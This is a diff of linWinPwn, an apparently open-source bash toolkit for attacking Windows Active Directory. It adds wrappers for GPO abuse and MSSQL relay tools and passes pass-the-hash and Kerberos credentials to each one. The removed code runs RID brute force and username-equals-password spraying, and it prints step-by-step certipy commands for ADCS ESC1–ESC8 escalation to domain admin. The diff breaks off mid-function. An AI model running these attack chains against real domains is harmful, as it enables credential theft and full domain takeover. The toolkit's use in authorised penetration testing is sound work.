@@ -14,7 +14,7 @@ NC='\033[0m'
 #Default variables
 user=""
 password=""
-modules="interactive"
+interactive_bool=true
 output_dir="$(pwd)"
 wordlists_dir="/opt/lwp-wordlists"
 pass_wordlist="/usr/share/wordlists/rockyou.txt"
@@ -59,9 +59,11 @@ if [ ! -f "${impacket_reg}" ]; then impacket_reg=$(which impacket_reg); fi
 impacket_smbserver=$(which smbserver.py)
 if [ ! -f "${impacket_smbserver}" ]; then impacket_smbserver=$(which impacket-smbserver); fi
 impacket_ticketer=$(which ticketer.py)
-if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket_ticketer); fi
+if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket-ticketer); fi
 impacket_ticketconverter=$(which ticketConverter.py)
-if [ ! -f "${impacket_ticketconverter}" ]; then impacket_ticketconverter=$(which impacket_ticketconverter); fi
+if [ ! -f "${impacket_ticketconverter}" ]; then impacket_ticketconverter=$(which impacket-ticketconverter); fi
+impacket_raiseChild=$(which raiseChild.py)
+if [ ! -f "${impacket_raiseChild}" ]; then impacket_raiseChild=$(which impacket-raiseChild); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -78,6 +80,7 @@ manspider=$(which manspider)
 coercer=$(which coercer)
 donpapi=$(which DonPAPI)
 bloodyad=$(which bloodyAD)
+mssqlrelay=$(which mssqlrelay)
 kerbrute="$scripts_dir/kerbrute"
 silenthound="$scripts_dir/silenthound.py"
 windapsearch="$scripts_dir/windapsearch"
@@ -95,6 +98,8 @@ ldapper="$scripts_dir/ldapper.py"
 orpheus="$scripts_dir/orpheus-main/orpheus.py"
 krbjack=$(which krbjack)
 adalanche="$scripts_dir/adalanche"
+pygpoabuse="$scripts_dir/pyGPOAbuse-master/pygpoabuse.py"
+GPOwned="$scripts_dir/GPOwned.py"
 nmap=$(which nmap)
 john=$(which john)
 
@@ -106,7 +111,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.9.5 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.0 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -125,8 +130,7 @@ help_linWinPwn () {
     echo -e "-A                AES Key (Kerberos authentication only) (default: empty)" 
     echo -e "-C                Location to PFX Certificate './cert.pfx' (default: empty)" 
     echo -e "--cert-pass       Password of provided PFX Certificate (optional)" 
-    echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
-    echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
+    echo -e "--auto            Run automatic enumeration"
     echo -e "-o/--output       Output directory (default: current dir)"
     echo -e "--auto-config     Run NTP sync with target DC and adds entry to /etc/hosts"
     echo -e "--ldaps           Use LDAPS instead of LDAP (port 636)"
@@ -157,14 +161,13 @@ while test $# -gt 0; do
             --cert-pass) pfxpass="${2}"; shift;; #Password of PFX certificate
             -t) dc_ip="${2}"; shift;; #mandatory
             --target) dc_ip="${2}"; shift;; #mandatory
-            -M) modules="${2}"; shift;; #comma separated modules to run
-            --Modules) modules="${2}"; shift;; #comma separated modules to run
             -o) output_dir="$(realpath ${2})"; shift;;
             --output) output_dir="$(realpath ${2})"; shift;;
             -I) attacker_IP="$(ip -f inet addr show $2 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')"; attacker_interface=$2; shift;;
             --interface) attacker_IP="$(ip -f inet addr show $2 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')"; attacker_interface=$2; shift;;
             -T) targets="${2}"; shift;;
             --targets) targets="${2}"; shift;;
+            --auto) interactive_bool=false; args+=($1);; #auto mode, disable interactive
             --auto-config) autoconfig_bool=true; args+=($1);;
             --ldaps) ldaps_bool=true; args+=($1);;
             --force-kerb) forcekerb_bool=true; args+=($1);;
@@ -245,26 +248,15 @@ prepare (){
     target_dc=${dc_ip_list}
     target_sql=${sql_ip_list}
 
-    mkdir -p ${output_dir}/Scans
+    mkdir -p ${output_dir}/ADCS
+    mkdir -p ${output_dir}/BruteForce
+    mkdir -p ${output_dir}/Credentials
     mkdir -p ${output_dir}/DomainRecon/Servers
     mkdir -p ${output_dir}/DomainRecon/Users
-    mkdir -p ${output_dir}/DomainRecon/BloodHound
-    mkdir -p ${output_dir}/DomainRecon/Adalanche
-    mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
-    mkdir -p ${output_dir}/DomainRecon/ADCS
-    mkdir -p ${output_dir}/DomainRecon/SilentHound
-    mkdir -p ${output_dir}/DomainRecon/ldeepDump
-    mkdir -p ${output_dir}/DomainRecon/bloodyAD
-    mkdir -p ${output_dir}/DomainRecon/LDAPPER
     mkdir -p ${output_dir}/Kerberos
-    mkdir -p ${output_dir}/Shares/smbmapDump
-    mkdir -p ${output_dir}/Shares/manspiderDump
-    mkdir -p ${output_dir}/Credentials
-    mkdir -p ${output_dir}/Credentials/SAMDump
+    mkdir -p ${output_dir}/Modification
+    mkdir -p ${output_dir}/Scans
     mkdir -p ${output_dir}/Vulnerabilities
-    mkdir -p ${output_dir}/Vulnerabilities/RPCDump
-    mkdir -p ${output_dir}/Vulnerabilities/Coercer
-    mkdir -p ${output_dir}/ConsoleData
 
     if [ ! -f ${servers_ip_list} ]; then /bin/touch ${servers_ip_list}; fi
     if [ ! -f ${servers_hostname_list} ]; then /bin/touch  ${servers_hostname_list}; fi
@@ -359,6 +351,9 @@ authenticate (){
         argument_sccm="-d ${domain}"
         argument_ldapper="-D ${domain} -U ${user} -P ''"
         argument_adalanche="--authmode ntlm --username ${user}@${domain} --password '!'"
+        argument_mssqlrelay="-u ${user}@${domain} -p ''"
+        argument_pygpoabuse="${domain}/${user}:''"
+        argument_GPOwned="-d ${domain} -u ${user} -p ''"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -397,6 +392,9 @@ authenticate (){
         argument_sccm="-d ${domain} -u ${user} -p ${password}"
         argument_ldapper="-D ${domain} -U ${user} -P ${password}"
         argument_adalanche="--authmode ntlm --username ${user}@${domain} --password ${password}"
+        argument_mssqlrelay="-u ${user}@${domain} -p ${password}"
+        argument_pygpoabuse="${domain}/${user}:${password}'"
+        argument_GPOwned="-d ${domain} -u ${user} -p ${password}"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -452,6 +450,9 @@ authenticate (){
                 argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
                 argument_bloodyad="-d ${domain} -u ${user} -p ${hash}"
                 argument_adalanche="--authmode ntlmpth --username ${user}@${domain} --password ${hash}"
+                argument_mssqlrelay="-u ${user}@${domain} -hashes ${hash}"
+                argument_pygpoabuse=" -hashes ${hash} ${domain}/${user}"
+                argument_GPOwned="-d ${domain} -u ${user} -hashes ${hash}"
                 auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
             else
                 echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
@@ -492,6 +493,8 @@ authenticate (){
             argument_bloodyad="-d ${domain} -u ${user} -k"
             argument_aced="-k -no-pass ${domain}/${user}"
             argument_sccm="-d ${domain} -u ${user} -k --no-pass"
+            argument_mssqlrelay="-u ${user}@${domain} -k --no-pass"
+            argument_pygpoabuse="${domain}/${user} -k -ccache $(realpath $krb5cc)"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath $krb5cc)${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath $krb5cc)..."
@@ -517,6 +520,7 @@ authenticate (){
         argument_p0dalirius="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
         argument_aced="-aes ${aeskey} ${domain}/${user}"
         argument_sccm="-d ${domain} -u ${user} -aes ${aeskey}"
+        argument_mssqlrelay="-u ${user}@${domain} -aes ${aeskey} -k"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -560,7 +564,9 @@ authenticate (){
         argument_bloodyad="-v DEBUG ${argument_bloodyad}"
         argument_aced="-debug ${argument_aced}"
         argument_sccm="-debug ${argument_sccm}"
+        mssqlrelay_verbose="-debug"
         adalanche_verbose="--loglevel Debug"
+        argument_pygpoabuse="${argument_pygpoabuse} -vv"
     fi
     
     echo -e ${auth_string}
@@ -591,7 +597,7 @@ dns_enum () {
         echo -e ""
     else
         echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
-        dns_records="${output_dir}/DomainRecon/Servers/dns_records_${dc_domain}.csv"
+        dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
         if [ ! -f "${dns_records}" ]; then
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                 echo -e "${PURPLE}[-] adidnsdump does not support kerberos authentication${NC}"
@@ -654,11 +660,12 @@ smb_scan () {
     fi
 }
 
-###### AD Enumeration
+###### ad_enum: AD Enumeration
 bhd_enum () {
     if [ ! -f "${bloodhound}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/BloodHound
         echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
         if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null | grep -v 'bloodhound_output')" ] ; then
             echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
@@ -686,6 +693,7 @@ bhd_enum_dconly () {
     if [ ! -f "${bloodhound}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/BloodHound
         echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
         if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null | grep -v 'bloodhound_output')" ] ; then
             echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
@@ -712,6 +720,7 @@ ldapdomaindump_enum () {
     if [ ! -f "${ldapdomaindump}" ] ; then
         echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
     else
+        mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
         echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
         if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ 2>/dev/null | grep -v 'ldd_output')" ] ; then
             echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
@@ -762,6 +771,12 @@ enum4linux_enum () {
     echo -e ""
 }
 
+ne_gpp () {
+    echo -e "${BLUE}[*] GPP Enumeration${NC}"
+    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
 ne_smb_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
@@ -781,9 +796,6 @@ ne_smb_enum () {
     echo -e ""
     echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
     run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --pass-pol --log ${output_dir}/DomainRecon/ne_passpol_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-    echo -e "${BLUE}[*] GPP Enumeration${NC}"
-    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -814,9 +826,6 @@ ne_ldap_enum () {
     echo -e "${BLUE}[*] Password not required Enumeration${NC}"
     run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
     echo -e ""
-    echo -e "${BLUE}[*] ADCS Enumeration${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
-    echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
     run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" 2>&1 > ${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt
     /bin/cat ${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass\|pwd" | tee ${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt 2>&1
@@ -833,66 +842,9 @@ ne_ldap_enum () {
     echo -e "${BLUE}[*] LDAP-signing check${NC}"
     run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} -M ldap-checker --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_ldap-checker_output_${dc_domain}.txt" 2>&1
     echo -e ""
-    echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
-    echo -e ""
 }
 
-ridbrute_attack () {
-    if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute" 2>&1 > ${output_dir}/DomainRecon/ne_rid_brute_${dc_domain}.txt
-        #Parsing user lists
-        /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
-        count=$(wc -l ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
-        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
-        parse_users
-    else
-        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
-    fi
-    echo -e ""
-}
-
-userpass_ne_check () {
-    parse_users
-    if [ ! -s "${users_list}" ] ; then
-         echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
-    else
-        echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
-        echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${target} -u ${users_list} -p ${users_list} --no-bruteforce --continue-on-success" 2>&1 > ${output_dir}/DomainRecon/ne_userpass_output_${dc_domain}.txt
-        /bin/cat ${output_dir}/DomainRecon/ne_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_ne_${dc_domain}.txt"
-        if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_ne_${dc_domain}.txt" ] ; then
-            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
-            /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_ne_${dc_domain}.txt 2>/dev/null
-        else
-            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
-        fi
-    fi
-    echo -e ""
-}
-
-pre2k_check () {
-    if [ ! -f "${pre2k}" ] ; then
-        echo -e "${RED}[-] Please verify the installation of pre2k${NC}"
-    else
-        echo -e "${BLUE}[*] Pre2k authentication check (Noisy!)${NC}"
-        pre2k_outputfile="${output_dir}/DomainRecon/pre2k_outputfile_${dc_domain}.txt"
-        if [ "${nullsess_bool}" == true ] ; then
-            if [ ! -s "${servers_hostname_list}" ] ; then
-                echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
-            else
-                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
-            fi
-        else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${output_dir}/DomainRecon/pre2k_output_${dc_domain}.txt"
-        fi
-    fi
-    echo -e ""
-}
-
-deleg_enum_imp () {
+deleg_enum () {
     if [ ! -f "${impacket_findDelegation}" ] ; then
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
@@ -902,46 +854,8 @@ deleg_enum_imp () {
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
     fi
-    echo -e ""
-}
-
-certi_py_enum () {
-    if [[ ! -f "${certi_py}" ]] ; then
-        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
-    else
-        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
-        else
-            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
-            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
-            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
-        fi
-    fi
-    echo -e ""
-}
-
-certipy_enum () {
-    if [[ ! -f "${certipy}" ]] ; then
-        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-    else
-        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
-        if [ -n "$(ls -A ${output_dir}/DomainRecon/ADCS/*_Certipy* 2>/dev/null)" ] ; then
-            echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
-        else
-            if [ "${nullsess_bool}" == true ] ; then
-                echo -e "${PURPLE}[-] certipy requires credentials${NC}"
-            else
-                current_dir=$(pwd)
-                cd ${output_dir}/DomainRecon/ADCS
-                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -stdout -old-bloodhound" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
-                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 >> ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
-                cd ${current_dir}
-            fi
-        fi
-    fi
-    adcs_vuln_parse
+    echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
+    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -949,11 +863,12 @@ fqdn_to_ldap_dn() {
   sed -e 's/[^ ]*/dc=&/g' <<<"${1//./ }" -e 's/ /,/g'
 }
 
-bloodyad_enum () {
+bloodyad_all_enum () {
     if [ ! -f "${bloodyad}" ] ; then
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
     else
-        echo -e "${BLUE}[*] bloodyad Enumeration${NC}"
+        mkdir -p ${output_dir}/DomainRecon/bloodyAD
+        echo -e "${BLUE}[*] bloodyad All Enumeration${NC}"
         if [ "${aeskey_bool}" == true ] ; then
             echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
         else
@@ -983,6 +898,21 @@ bloodyad_enum () {
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get dnsDump" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
             echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
             /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt 2>/dev/null | sed -n '/[^\n]*\*/,/^$/p'
+       fi
+    fi
+    echo -e ""
+}
+
+bloodyad_write_enum () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/DomainRecon/bloodyAD
+        echo -e "${BLUE}[*] bloodyad write rights Enumeration${NC}"
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${CYAN}[*] Searching for writable objects${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
        fi
@@ -990,159 +920,11 @@ bloodyad_enum () {
     echo -e ""
 }
 
-ne_adcs_enum (){
-    if [ ! -f "${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
-        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
-    fi
-    pki_servers=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
-    pki_cas=$(/bin/cat ${output_dir}/DomainRecon/ADCS/ne_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
-
-}
-
-adcs_vuln_parse (){
-    ne_adcs_enum
-    esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc1_vuln ]]; then
-        echo -e "${GREEN}[+] Templates vulnerable to ESC1 potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc1_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
-        done
-    fi
-
-    esc2_3_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select ((."[!] Vulnerabilities"."ESC2" or ."[!] Vulnerabilities"."ESC3") and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc2_3_vuln ]]; then
-        echo -e "${GREEN}[+] Templates vulnerable to ESC2 or ESC3 potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc2_3_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-            echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
-            echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
-        done
-    fi
-
-    esc4_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC4" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc4_vuln ]]; then
-        echo -e "${GREEN}[+] Templates vulnerable to ESC4 potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc4_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
-            echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
-            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
-            echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
-            echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
-        done
-    fi
-
-    esc6_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC6") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc6_vuln ]]; then
-        echo -e "${GREEN}[+] ESC6 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc6_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
-            echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template User -upn domain_admin@${dc_domain}"
-            echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
-        done
-    fi
-
-    esc7_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC7") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc7_vuln ]]; then
-        echo -e "${GREEN}[+] ESC7 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc7_vuln; do
-            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
-            echo -e "${CYAN}1. Add a new officer:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -add-officer "${user}" -dc-ip ${dc_ip}"
-            echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} --ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
-            echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
-            echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
-            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -issue-request <request_ID> -dc-ip ${dc_ip}"
-            echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -retrieve <request_ID> -dc-ip ${dc_ip}"
-            echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
-        done
-    fi
-
-    esc8_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC8") | ."CA Name"' "${output_dir}/DomainRecon/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
-    if [[ ! -z $esc8_vuln ]]; then
-        echo -e "${GREEN}[+] ESC8 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulntemp in $esc8_vuln; do
